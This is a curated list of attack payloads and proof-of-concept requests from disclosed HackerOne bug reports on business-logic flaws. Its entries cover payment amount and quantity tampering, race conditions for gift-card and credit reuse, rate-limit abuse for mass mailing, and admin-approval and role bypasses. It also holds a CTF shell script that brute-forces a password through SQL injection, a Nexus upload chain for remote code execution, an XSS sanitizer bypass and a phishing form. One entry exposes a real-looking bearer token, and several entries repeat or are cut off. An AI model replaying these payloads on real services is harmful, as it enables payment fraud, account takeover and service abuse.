# Business Logic Flaws  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1295844](https://hackerone.com/reports/1295844)  -  Modify in-flight data to payment provider Smart2Pay
*critical, $7,500*

```http
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
Referer: https://store.steampowered.com/

MerchantID=1102&MerchantTransactionID=███&Amount=2000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brixamount100abc%40███████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=███
```

## 2. [#1295844](https://hackerone.com/reports/1295844)  -  Modify in-flight data to payment provider Smart2Pay
*critical, $7,500*

```http
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
Referer: https://store.steampowered.com/

MerchantID=1102&MerchantTransactionID=██████&Amount2=000&Currency=PLN&ReturnURL=https%3A%2F%2Fstore.steampowered.com%2Fpaypal%2Fsmart2pay%2F████%2F&MethodID=12&Country=PL&CustomerEmail=brix&amount=100&ab=c%40██████████&CustomerName=_drbrix_&SkipHPP=1&Description=Steam+Purchase&SkinID=101&Hash=█████████
```

## 3. [#3399218](https://hackerone.com/reports/3399218)  -  Improper sanitisation of input in the settings could cause DoS
*low*

```http
POST /test2/revive-adserver-6.0.1/www/admin/account-settings-email.php HTTP/1.1
Host: localhost
Content-Length: 1122
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAFTySI5FcKHdgQSw
Referer: http://localhost/test2/revive-adserver-6.0.1/www/admin/account-settings-email.php
Cookie: sessionID=44958de8497392e940916ecd332da541; ox_install_session_id=ln1aq7d4aopg1511andp5oocji

------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="submitok"

true
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="email_fromAddress"

1@aa.com
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="email_fromName"

1@aa.com
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="email_fromCompany"

1@aa.com
------WebKitFormBoundaryAFTySI5FcKHdgQSw
Content-Disposition: form-data; name="submitok"
# … truncated …
```

## 4. [#974892](https://hackerone.com/reports/974892)  -  Race Condition of Transfer data Credits to Organization Leads to Add Extra free Data Credits to the Organization
*medium, $250*

```http
POST /api/data_credits/transfer_dc HTTP/1.1
Host: console.helium.com
Content-Length: 66
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IndsbXNzZUJDY01oSjdpQ3RjZ2wyeiJ9.eyJuaWNrbmFtZSI6ImVpc3NlbjVjKzIiLCJuYW1lIjoiZWlzc2VuNWMrMkB3ZWFyZWhhY2tlcm9uZS5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvM2E1YTY3MjhlODkyN2YxYTgxYmJiZWQzY2I0MGI2OWI_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZlaS5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wOS0wNFQxNzo1NDowNy4xMjFaIiwiZW1haWwiOiJlaXNzZW41YysyQHdlYXJlaGFja2Vyb25lLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL2F1dGguaGVsaXVtLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZjUyN2YwYTMzYzBhMjAwNmQ1OTJjNDkiLCJhdWQiOiJiSGx0N043MEhPVHFZSkJ2R2NvbjFsQVJGcDc4WFczMyIsImlhdCI6MTU5OTI0MjI0NCwiZXhwIjoxNTk5Mjc4MjQ0LCJub25jZSI6InJhQ25sSE1kM1o4cERManNORUt0Rk80R2ZBZlRkUDdfUkIyWXRGNTB4MlcifQ.LdiVe8woYQ9nKky6s9x0AdcH75gf0lrSqO9wWhTW6aD38VDesRgZQZcopvKWwltdv0g6cfd0qSc0NOXSTJU-YCxnM_SmTwQdzz_w7t3tdj4H4NPMgxvk7Wi0Q0Ot5gnBFy-Hs43kNq_6JgON2fdOd3ANxTPyKo10sp_z_9I6XoPydUKl0vWOqCAAtqWY09yKnsAcUOiKAvwlToyRPpyzb0CiB2CkITgXRpq5I5dkx0MSikgfOtbMgHwXIwyR4221VaU9quZ21gHCj5h_b-eS5ZDK8c5lqrjheNHv0hSSquDOUJ-PJuZIXmdzthC4nDNUXFr56h5yBxdwvz14mF-xIQ
Content-Type: application/json
Origin: https://console.helium.com
# … truncated …
```

## 5. [#1295844](https://hackerone.com/reports/1295844)  -  Modify in-flight data to payment provider Smart2Pay
*critical, $7,500*

```http
POST / HTTP/1.1
Host: globalapi.smart2pay.com
Content-Length: 388
Origin: https://store.steampowered.com
Content-Type: application/x-www-form-urlencoded
```

## 6. [#1087188](https://hackerone.com/reports/1087188)  -  Race Condition allows to get more free trials and get more than 100 languages and strings for free
*low*

```http
POST /trial/ HTTP/1.1
Host: hosted.weblate.org
Referer: https://hosted.weblate.org/
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: https://hosted.weblate.org
Cookie: __cfduid=d584084fe0b125b922a38b58143580cde1610884176; django_language=en; sessionid=csxoox0r…

csrfmiddlewaretoken=D74cp8jYYfF2xMBJ3TtawMKpI7T6OU27yuUYwra8QWOmMaryGdqTjWTzU1a15Q2z
```

## 7. [#403783](https://hackerone.com/reports/403783)  -  [www.zomato.com] Tampering with Order Quantity and paying less amount then actual amount, leads to business loss
*high*

```http
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 825
Cookie: <redacted>

████████&order%5Bdishes%5D%5B0%5D%5Btype%5D=dish&order%5Bdishes%5D%5B0%5D%5Bcomment%5D=&order%5Bdishes%5D%5B0%5D%5Bitem_id%5D=481238585&order%5Bdishes%5D%5B0%5D%5Bitem_name%5D=Veg%20Biryani%20%5BRegular%5D&order%5Bdishes%5D%5B0%5D%5Bmrp_item%5D=0&order%5Bdishes%5D%5B0%5D%5Bquantity%5D=1&order%5Bdishes%5D%5B0%5D%5Btags%5D=1&order%5Bdishes%5D%5B0%5D%5Btax_inclusive%5D=0&order%5Bdishes%5D%5B0%5D%5Bunit_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Btotal_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Bis_bogo_active%5D=false&order%5Bdishes%5D%5B0%5D%5BbogoItemsCount%5D=0&order%5Bdishes%5D%5B0%5D%5BalwaysShowOnCheckout%5D=0&order%5Bdishes%5D%5B0%5D%5Bduration_id%5D=0&res_id=███████&address_id=██████&voucher_code=&payment_method_type=&payment_method_id=0&card_bin=&case=calculatecart&csrfToken=███████
```

## 8. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```
#!/bin/sh

while read word; do

/bin/echo -n "$word: "
path=$(/bin/echo -n "../api/$word" |xxd -p | tr -d '\n')
picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
echo $picurl

curl -s "https://hackyholidays.h1ctf.com$picurl" |grep -v 404
echo
done
```

## 9. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```
#!/bin/sh

start=$1
for word in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
/bin/echo -n "$word: "
path=$(/bin/echo -n "../api/user?pass=$start$word%" |xxd -p | tr -d '\n')
echo path: ${path}
picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
echo $picurl

curl -s "https://hackyholidays.h1ctf.com$picurl"  | grep -i invalid
echo
done
```

## 10. [#1675674](https://hackerone.com/reports/1675674)  -  An Attacker Can Flag Draft Job Posts And Can Disclose The Draft Job Posts Details [ Similar to #1581528 Resolved Report]
*medium*

```http
POST /lite/flag-content?contentUrn=urn:li:jobPosting:██████████&reason=SPAM_CONTENT&contentSource=JOBS_PREMIUM_OFFLINE&authorProfileId=0&trk=report-content HTTP/2
Host: www.linkedin.com
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/jobs/search/?currentJobId=████████
Content-Length: 0
```

## 11. [#925519](https://hackerone.com/reports/925519)  -  [play.mtn.co.za] Application level DoS via xmlrpc.php
*medium*

```http
POST /xmlrpc.php HTTP/1.1
Host: play.mtn.co.za
Content-Length: 91

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

## 12. [#925519](https://hackerone.com/reports/925519)  -  [play.mtn.co.za] Application level DoS via xmlrpc.php
*medium*

```http
POST /xmlrpc.php HTTP/1.1
Host: play.mtn.co.za
Content-Length: 91

<methodCall>
```

## 13. [#683965](https://hackerone.com/reports/683965)  -  Unrestricted File Upload Leading to Remote Code Execution
*critical*

```http
POST /nexus/service/local/artifact/maven/content HTTP/1.1
Host: nexus-host
Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269
Content-Length: 33250
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

-----------------------------103850373015325909411337083269
```

## 14. [#1285538](https://hackerone.com/reports/1285538)  -  Race condition on action: Invite members to a team
*low*

```http
POST /team/memberships HTTP/2
Host: dashboard.omise.co
Cookie: ██████████
Content-Length: 271
Origin: ███
Content-Type: application/x-www-form-urlencoded
Referer: ███████

authenticity_token=<TOKEN>email=<INVITED-EMAIL>&membership%5Badmin%5D=0&membership%5Badmin%5D=1&membership%5Btechnical%5D=0&membership%5Btechnical%5D=1&commit=Send+invitation
```

## 15. [#1285538](https://hackerone.com/reports/1285538)  -  Race condition on action: Invite members to a team
*low*

```http
POST /team/memberships HTTP/2
Host: dashboard.omise.co
Cookie: ██████████
Content-Length: 271
Origin: ███
Content-Type: application/x-www-form-urlencoded
```

## 16. [#3399218](https://hackerone.com/reports/3399218)  -  Improper sanitisation of input in the settings could cause DoS
*low*

```http
POST /test2/revive-adserver-6.0.1/www/admin/account-settings-email.php HTTP/1.1
Host: localhost
Content-Length: 1122
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAFTySI5FcKHdgQSw
```

## 17. [#297359](https://hackerone.com/reports/297359)  -  No Rate Limit in email leads to huge Mass mailings
*low*

```http
POST /web-client/api/ad-units/email-instructions HTTP/1.1
Host: app.mopub.com
Referer: https://app.mopub.com/ad-unit?key=█████████&showIntegration=true
Content-Type: application/json
Content-Length: 88
Cookie: _ga=████; _gid=███; csrftoken=███; mp_mixpanel__c=8; sessionid=████████; mp_c99579c4804fba6b…

{"addresses":["§████@mailinator.com§"],"key":"███"}
```

## 18. [#1543159](https://hackerone.com/reports/1543159)  -  Able to approve admin approval and change effective status without adding payment details .
*high, $5,000*

```http
PATCH /api/v2.0/accounts/█████/ads/██████████ HTTP/2
Host: ads-api.reddit.com
Referer: https://ads.reddit.com/
Authorization: bearer token
Content-Type: application/json
Origin: https://ads.reddit.com
Content-Length: 101

{"data":
{"configured_status":"ACTIVE",
"effective_status":"ACTIVE",
"admin_approval":"APPROVED"
}}
```

## 19. [#1543159](https://hackerone.com/reports/1543159)  -  Able to approve admin approval and change effective status without adding payment details .
*high, $5,000*

```http
PATCH /api/v2.0/accounts/█████/ads/██████████ HTTP/2
Host: ads-api.reddit.com
Referer: https://ads.reddit.com/
Authorization: bearer token
Content-Type: application/json
Origin: https://ads.reddit.com
Content-Length: 101
```

## 20. [#403783](https://hackerone.com/reports/403783)  -  [www.zomato.com] Tampering with Order Quantity and paying less amount then actual amount, leads to business loss
*high*

```http
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 2444
Cookie: <redacted>

case=makeonlineorder&res_id=█████████&order={"charges":[{"item_name":"Delivery Charge","total_cost":10,"type":"charge","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":96623,"display_cost":"â¹10"}],"taxes":[{"item_name":"Taxes","total_cost":0.6,"type":"tax","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹0.60"}],"subtotal2":[{"item_name":"Subtotal","total_cost":12,"type":"subtotal2","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹12.00"}],"total":[{"item_name":"Grand Total","total_cost":"22.60","type":"total","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹22.60"}],"dishes":[{"type":"dish","comment":"","groups":[],"item_id":481238585,"item_name":"Veg Biryani [Regular]","mrp_item":0,"quantity":0.1,"tags":"1","tax_inclusive":0,"unit_cost":120,"total_cost":120,"is_bogo_active":false,"bogoItemsCount":0,"alwaysShowOnCheckout":0,"duration_id":0}]}&██████
# … truncated …
```

## 21. [#1991376](https://hackerone.com/reports/1991376)  -  the domain is truck-admin.eu-east-1.indriverapp.com and Enter the management system of the blasting mobile phone verification code
*high*

```http
POST /proxy/truck/api/admin/login HTTP/2
Host: truck-admin.eu-east-1.indriverapp.com
Cookie: _gcl_au=1.1.354145541.1684380001; _ga=GA1.1.1412822094.1684380001; _ga_YBFM6LW448=GS1.1.1684…
Content-Length: 37
Content-Type: application/json
Origin: https://truck-admin.eu-east-1.indriverapp.com
Referer: https://truck-admin.eu-east-1.indriverapp.com/admin/auth

{"phone":"██████","code":"1234"}
```

## 22. [#1991376](https://hackerone.com/reports/1991376)  -  the domain is truck-admin.eu-east-1.indriverapp.com and Enter the management system of the blasting mobile phone verification code
*high*

```http
POST /proxy/truck/api/admin/login HTTP/2
Host: truck-admin.eu-east-1.indriverapp.com
Cookie: _gcl_au=1.1.354145541.1684380001; _ga=GA1.1.1412822094.1684380001; _ga_YBFM6LW448=GS1.1.1684…
Content-Length: 37
Content-Type: application/json
Origin: https://truck-admin.eu-east-1.indriverapp.com
```

## 23. [#683965](https://hackerone.com/reports/683965)  -  Unrestricted File Upload Leading to Remote Code Execution
*critical*

```http
POST /nexus/service/local/artifact/maven/content HTTP/1.1
Host: nexus-host
Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269
Content-Length: 33250
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="r"

5000
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="g"

Programs
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="a"

Startup
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="v"

.
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="p"

jar
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="c"


-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="e"

exe
# … truncated …
```

## 24. [#3733910](https://hackerone.com/reports/3733910)  -  CVE-2026-8932: incomplete mTLS config matching in conn reuse
*low*

```bash
$ ./F12_poc

=== Request A (correct passwd, expect 200) ===
* Added server.test:8443:127.0.0.1 to DNS cache
* Hostname server.test was found in DNS cache
* Host server.test:8443 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:8443...
* ALPN: curl offers h2,http/1.1
* SSL Trust: peer verification disabled
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*   subject: CN=server.test
*   start date: May 13 18:12:38 2026 GMT
*   expire date: May 14 18:12:38 2026 GMT
*   issuer: CN=server.test
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* OpenSSL verify result: 12
*  SSL certificate verification failed, continuing anyway!
* Established connection to server.test (127.0.0.1 port 8443) from 127.0.0.1 port 59792
* using HTTP/1.x
> GET / HTTP/1.1
Host: server.test:8443
Accept: */*

* Request completely sent off
< HTTP/1.1 200 OK
< Content-Length: 2
< Connection: keep-alive
< Keep-Alive: timeout=30
<
* Connection #0 to host server.test:8443 left intact
A done: code=200 conn_id=0 ra=No error
# … truncated …
```

## 25. [#3591764](https://hackerone.com/reports/3591764)  -  Business Logic Bypass Allows Setting “Read Access” Role Without Pro Plan Subscription
*medium*

```http
POST /projects/Project-ID/magic-codes HTTP/2
Host: api.lovable.dev
Cookie: [Your-Cookie]
Referer: https://lovable.dev/
Authorization: Bearer [Your-Authorization-Header]
Content-Type: application/json
Content-Length: 23
Origin: https://lovable.dev

{"access_level":"read"}
```

## 26. [#3591764](https://hackerone.com/reports/3591764)  -  Business Logic Bypass Allows Setting “Read Access” Role Without Pro Plan Subscription
*medium*

```http
POST /projects/Project-ID/magic-codes HTTP/2
Host: api.lovable.dev
Cookie: [Your-Cookie]
Referer: https://lovable.dev/
Authorization: Bearer [Your-Authorization-Header]
Content-Type: application/json
Content-Length: 23
Origin: https://lovable.dev
```

## 27. [#1675674](https://hackerone.com/reports/1675674)  -  An Attacker Can Flag Draft Job Posts And Can Disclose The Draft Job Posts Details [ Similar to #1581528 Resolved Report]
*medium*

```http
POST /lite/flag-content?contentUrn=urn:li:jobPosting:██████████&reason=SPAM_CONTENT&contentSource=JOBS_PREMIUM_OFFLINE&authorProfileId=0&trk=report-content HTTP/2
Host: www.linkedin.com
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/jobs/search/?currentJobId=████████
```

## 28. [#683965](https://hackerone.com/reports/683965)  -  Unrestricted File Upload Leading to Remote Code Execution
*critical*

```http
POST /nexus/service/local/repositories HTTP/1.1
Host: nexus-host
Content-Length: 443
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}

HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 16:58:53 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: application/json; charset=UTF-8
Content-Length: 638
Connection: close

{"data":{"contentResourceURI":"http://<redacted>/nexus/content/repositories/5000","id":"5000","name":"MyTestRepo","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","format":"maven2","repoType":"hosted","exposed":true,"writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","downloadRemoteIndexes":false,"overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","defaultLocalStorageUrl":"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000"}}
# … truncated …
```

## 29. [#1691603](https://hackerone.com/reports/1691603)  -  A Unverified User Can Post Newsletter (Which Is Not Allowed Through Application UI)
*low*

```http
POST /voyager/api/publishing/contentSeries HTTP/2
Host: www.linkedin.com
Cookie: xxx
Content-Type: application/json; charset=utf-8
Content-Length: 185
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/post/edit/███

{"title":"dfghjk","description":"dgfhjkcgvhbjnkm","publishFrequency":{"duration":2,"unit":"MONTH"},"inviteTargetAudiences":true,"logoUrn":"urn:li:digitalmediaAsset:█████"}
```

## 30. [#1691603](https://hackerone.com/reports/1691603)  -  A Unverified User Can Post Newsletter (Which Is Not Allowed Through Application UI)
*low*

```http
POST /voyager/api/publishing/contentSeries HTTP/2
Host: www.linkedin.com
Cookie: xxx
Content-Type: application/json; charset=utf-8
Content-Length: 185
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/post/edit/██████

{"title":"dfghjk","description":"dgfhjkcgvhbjnkm","publishFrequency":{"duration":2,"unit":"MONTH"},"inviteTargetAudiences":true,"logoUrn":"urn:li:digitalmediaAsset:████"}
```

## 31. [#759247](https://hackerone.com/reports/759247)  -  Race Condition allows to redeem multiple times gift cards which leads to free "money"
*high*

```http
POST /fi/redeem HTTP/1.1
Host: sandbox.reverb.com
Referer: https://sandbox.reverb.com/fi/redeem
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
Cookie: <cookies>

utf8=%E2%9C%93&authenticity_token=<CSRF token>&token=<GIFT card>&commit=Redeem+Now
```

## 32. [#308158](https://hackerone.com/reports/308158)  -  [html-janitor] Bypassing sanitization using DOM clobbering
*high*

```javascript
var myJanitor = new HTMLJanitor({tags:{p:{}}});
var cleanHtml = myJanitor.clean("<form><object onmouseover=alert(document.domain) name=_sanitized></object></form>")
console.log(cleanHtml) // logs: <form><object onmouseover=alert(document.domain) name=_sanitized></object></form>
```

## 33. [#1047124](https://hackerone.com/reports/1047124)  -  No rate limit in email subscription
*medium*

```http
POST /fr/subscribe/ HTTP/1.1
Host: stripo.email
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-TOKEN: OC5q3gnsKxUZRrGIN3ke5ZdqEbmneEuknaNmnQUe
X-Requested-With: XMLHttpRequest
Content-Length: 129
Origin: https://stripo.email
Referer: https://stripo.email/

_token=&source=LANDING&subscribe-email=kakema3700%40tdcryo.com&g-recaptcha-response=
```

## 34. [#922470](https://hackerone.com/reports/922470)  -  No rate limiting on sinup page
*low*

```http
POST /index.php/apps/preferred_providers/password/submit/D4oCzV7LrgyTtULRXsOp2 HTTP/1.1
Host: efss.qloud.my
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: null
Cookie: ocn6e46ay0uf=g5gaufmdvaa2ab480rl3m3e2fp; oc_sessionPassphrase=rXsGoXrFnFNmXjG7wqHo25XUJ75w4g…

ocsapirequest=&email=<targer username>&password=<target password>
```

## 35. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /my-diary/?template=index.php HTTP/1.1
Host: hackyholidays.h1ctf.com

...

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
```

## 36. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php HTTP/1.1

...

<?php
if( $_SERVER["REMOTE_ADDR"] == '127.0.0.1' ){
?>

[...SNIP...]

flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
```

## 37. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup={{name}}&preview_data={"name"%3a"{{template%3a38dhs_admins_only_header.html}}","email"%3a"alice%40test.com"}

...
  <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

## 38. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /my-diary/?template=index.php HTTP/1.1
Host: hackyholidays.h1ctf.com

...
```

## 39. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /my-diary/?template=secretsecretadminadmin.php.phpadminadmin.php.php HTTP/1.1

...
```

## 40. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup={{name}}&preview_data={"name"%3a"{{template%3a38dhs_admins_only_header.html}}","email"%3a"alice%40test.com"}
```

## 41. [#1546268](https://hackerone.com/reports/1546268)  -  CVE-2022-27775: Bad local IPv6 connection reuse
*low*

```http
GET /x HTTP/1.1
Host: [ipv6addr]:9999

GET /y HTTP/1.1
```

## 42. [#771694](https://hackerone.com/reports/771694)  -  An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss
*high*

```http
POST /marketplace/api/purchases/bulk HTTP/1.1
Host: www.semrush.com
Referer: https://www.semrush.com/marketplace/offers/
Content-type: application/json
Origin: https://www.semrush.com
Content-Length: 45
Cookie: COOKIES

{"items":{"article_500":1,"article_1000":1}}
```

## 43. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
POST /swag-shop/api/purchase HTTP/1.1
Host: hackyholidays.h1ctf.com

id=1
```

## 44. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com

HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 16 Dec 2020 06:52:00 GMT
Content-Type: application/json
Connection: close
Content-Length: 35

{"error":"Missing required fields"}
```

## 45. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=0 HTTP/1.1

[{"id":"3348","content":"Setting Target Information","goto":false},{"id":"3350","content":"Getting Host Information for: x.*********.tk","goto":false},{"id":"3351","content":"Host resolves to 192.168.1.1","goto":false},{"id":"3352","content":"Spinning up botnet","goto":false}]
```

## 46. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3352 HTTP/1.1
```

## 47. [#1065885](https://hackerone.com/reports/1065885)  -  Complete destruction of the Grinch server
*high*

```http
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3360 HTTP/1.1
```

## 48. [#2125049](https://hackerone.com/reports/2125049)  -  Unlimited fake rate to the passenger in city to city, Affected endpoint `/api/v1/reviews/ride/<ID>/driver`
*medium*

```http
POST /api/v1/reviews/ride/███/driver HTTP/2
    Host: intercity-3.eu-east-1.indriverapp.com
    Authorization: Bearer █████
    Content-Type: application/json; charset=utf-8
    Content-Length: 32
```

## 49. [#997070](https://hackerone.com/reports/997070)  -  No rate limiting for confirmation email lead to huge Mass mailings
*medium*

```http
POST /index.php/apps/registration/ HTTP/1.1
Host: efss.qloud.my
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Origin: null

email=victimattack%40gmail.com&requesttoken=Cdt30n8l%2FBhsd0fTp4wDDyvOvA26umsBZgymNLTrJWI%3D%3AZL8W4SURzVcIIAm06cNxOlm5jUrP1QloEW3RWO2SQQA%3D
```

## 50. [#1139535](https://hackerone.com/reports/1139535)  -  Changing the 2FA secret key and backup codes without knowing the 2FA OTP
*medium*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
content-type: application/json
Content-Length: 1221

{"operationName":"UpdateTwoFactorAuthenticationCredentials","variables":{"password":"******************************","otp_code":"******************************","signature":"f3a55d33972b3ac5433dc1ea3f36bed8b6813bf9","backup_codes":["b144ab9f9bc17195","09cc146d7a382931","95bd3133a5bab481","b54d2a14acc7ff0b","46f36d0d72096963"],"totp_secret":"███████","backup_code":"b144ab9f9bc17195"},"query":"mutation UpdateTwoFactorAuthenticationCredentials($password: String!, $otp_code: String!, $backup_code: String!, $totp_secret: String!, $backup_codes: [String]!, $signature: String!) {\n  updateTwoFactorAuthenticationCredentials(input: {password: $password, otp_code: $otp_code, backup_code: $backup_code, totp_secret: $totp_secret, backup_codes: $backup_codes, signature: $signature}) {\n    was_successful\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    me {\n      id\n      remaining_otp_backup_code_count\n      totp_supported\n      totp_enabled\n      remaining_otp_backup_code_count\n      account_recovery_phone_number\n      __typename\n    }\n    __typename\n  }\n}\n"}
# … truncated …
```

## 51. [#422279](https://hackerone.com/reports/422279)  -  H1514 Simple phishing using auto-created modal with weak URL-pattern check in incontext_app_link
*medium*

```html
<center>
<form onsubmit="alert('your login is: ' + document.getElementById('u').value + ':' + document.getElementById('p').value); return false">
<input id="u" placeholder="Email address" style=" position: absolute; top: 140px; left: 80px; font-size: 20px; height: 50px; border: 0; width: 400px;">
<input id="p" placeholder="Password" type="password" style="position: absolute; font-size: 20px; height: 50px; border: 0; width: 400px; left: 80px; top: 210px;">
